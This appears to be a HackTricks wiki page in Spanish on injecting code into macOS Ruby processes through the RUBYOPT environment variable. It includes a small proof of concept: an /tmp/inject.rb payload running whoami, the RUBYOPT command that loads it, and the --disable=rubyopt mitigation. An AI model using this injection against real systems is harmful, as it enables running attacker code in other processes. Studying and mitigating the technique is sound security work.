# Inyección en aplicaciones Ruby de macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analiza los switches de línea de comandos compatibles desde la variable de entorno `RUBYOPT` antes de ejecutar un script. Ruby rechaza la ejecución de código mediante `-e` en `RUBYOPT`, pero `-I` puede anteponer un directorio de búsqueda de libraries y `-r` puede requerir una library. Por lo tanto, un proceso que inicia Ruby con variables de entorno controladas por el atacante puede hacer que cargue código Ruby controlado por el atacante.<sup>[[1]](#references)</sup>

Crea `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Crea un script benigno de Ruby como `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Ejecútalo con un valor controlado de `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Para deshabilitar este comportamiento, pasa `--disable=rubyopt` (o `--disable-rubyopt`) **antes** del nombre del script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Una opción escrita después de `hello.rb` se pasa al script en `ARGV`; no desactiva el procesamiento previo de `RUBYOPT` por parte de Ruby.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Documentación de Ruby - Opciones de línea de comandos de Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
